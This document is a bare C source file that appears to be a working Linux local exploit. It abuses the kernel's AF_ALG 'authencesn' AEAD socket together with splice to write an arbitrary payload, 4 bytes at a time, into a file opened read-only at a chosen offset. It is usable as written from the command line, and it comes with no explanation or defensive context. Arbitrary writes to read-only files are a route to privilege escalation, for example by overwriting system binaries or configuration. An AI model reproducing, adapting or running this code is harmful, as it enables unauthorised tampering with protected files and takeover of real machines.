#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/if_alg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/sendfile.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef SOL_ALG
#define SOL_ALG 279
#endif

#define MSG_MORE_FLAG 32768

static void die(const char *what) {
    perror(what);
    exit(1);
}

static void xclose(int fd) {
    if (fd >= 0) {
        close(fd);
    }
}

static unsigned char *read_file(const char *path, size_t *len) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        die("open(payload)");
    }

    off_t end = lseek(fd, 0, SEEK_END);
    if (end < 0) {
        die("lseek(payload)");
    }
    if (lseek(fd, 0, SEEK_SET) < 0) {
        die("lseek(payload)");
    }

    unsigned char *buf = malloc((size_t)end ? (size_t)end : 1);
    if (!buf) {
        die("malloc(payload)");
    }

    size_t got = 0;
    while (got < (size_t)end) {
        ssize_t n = read(fd, buf + got, (size_t)end - got);
        if (n < 0) {
            die("read(payload)");
        }
        if (n == 0) {
            break;
        }
        got += (size_t)n;
    }

    close(fd);
    *len = got;
    return buf;
}

static int alg_accept(void) {
    int afd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (afd < 0) {
        die("socket(AF_ALG)");
    }

    struct sockaddr_alg sa;
    memset(&sa, 0, sizeof(sa));
    sa.salg_family = AF_ALG;
    strcpy((char *)sa.salg_type, "aead");
    strcpy((char *)sa.salg_name, "authencesn(hmac(sha256),cbc(aes))");

    if (bind(afd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        die("bind(AF_ALG)");
    }

    unsigned char auth[40] = {0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x10};
    if (setsockopt(afd, SOL_ALG, 1, auth, sizeof(auth)) < 0) {
        die("setsockopt(AEAD_AUTHSIZE)");
    }
    if (setsockopt(afd, SOL_ALG, 5, NULL, 4) < 0) {
        die("setsockopt(AEAD_ASSOCLEN)");
    }

    int op = accept(afd, NULL, NULL);
    if (op < 0) {
        die("accept(AF_ALG)");
    }

    close(afd);
    return op;
}

static void sendmsg_alg(int fd, const unsigned char chunk[4]) {
    unsigned char data[8] = {'A', 'A', 'A', 'A', chunk[0], chunk[1], chunk[2], chunk[3]};
    struct iovec iov;
    iov.iov_base = data;
    iov.iov_len = sizeof(data);

    unsigned char control[CMSG_SPACE(4) + CMSG_SPACE(20) + CMSG_SPACE(4)];
    memset(control, 0, sizeof(control));

    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = control;
    msg.msg_controllen = sizeof(control);

    struct cmsghdr *c = CMSG_FIRSTHDR(&msg);
    c->cmsg_level = SOL_ALG;
    c->cmsg_type = 3;
    c->cmsg_len = CMSG_LEN(4);

    c = CMSG_NXTHDR(&msg, c);
    c->cmsg_level = SOL_ALG;
    c->cmsg_type = 2;
    c->cmsg_len = CMSG_LEN(20);
    unsigned char *iv = CMSG_DATA(c);
    iv[0] = 0x10;

    c = CMSG_NXTHDR(&msg, c);
    c->cmsg_level = SOL_ALG;
    c->cmsg_type = 4;
    c->cmsg_len = CMSG_LEN(4);
    unsigned char *assoc = CMSG_DATA(c);
    assoc[0] = 0x08;

    if (sendmsg(fd, &msg, MSG_MORE_FLAG) < 0) {
        die("sendmsg(AF_ALG)");
    }
}

static void write4(int target_fd, size_t offset, const unsigned char chunk[4]) {
    int op = alg_accept();
    int pipes[2] = {-1, -1};
    if (pipe(pipes) < 0) {
        die("pipe");
    }

    sendmsg_alg(op, chunk);

    size_t size = offset + 4;
    loff_t in_off = 0;
    if (splice(target_fd, &in_off, pipes[1], NULL, size, 0) < 0) {
        die("splice(file->pipe)");
    }
    if (splice(pipes[0], NULL, op, NULL, size, 0) < 0) {
        die("splice(pipe->alg)");
    }

    unsigned char discard[4096];
    size_t need = offset + 8;
    while (need > 0) {
        size_t want = need < sizeof(discard) ? need : sizeof(discard);
        ssize_t n = read(op, discard, want);
        if (n <= 0) {
            break;
        }
        need -= (size_t)n;
    }

    xclose(pipes[0]);
    xclose(pipes[1]);
    xclose(op);
}

int main(int argc, char **argv) {
    if (argc != 4) {
        fprintf(stderr, "usage: %s TARGET OFFSET PAYLOAD_FILE\n", argv[0]);
        return 2;
    }

    char *end = NULL;
    unsigned long long base_offset = strtoull(argv[2], &end, 0);
    if (!end || *end) {
        fprintf(stderr, "bad offset: %s\n", argv[2]);
        return 2;
    }

    size_t len = 0;
    unsigned char *data = read_file(argv[3], &len);

    int target_fd = open(argv[1], O_RDONLY);
    if (target_fd < 0) {
        die("open(target)");
    }

    for (size_t i = 0; i < len; i += 4) {
        unsigned char chunk[4] = {0, 0, 0, 0};
        size_t left = len - i;
        memcpy(chunk, data + i, left < 4 ? left : 4);
        write4(target_fd, (size_t)base_offset + i, chunk);
    }

    close(target_fd);
    free(data);
    return 0;
}
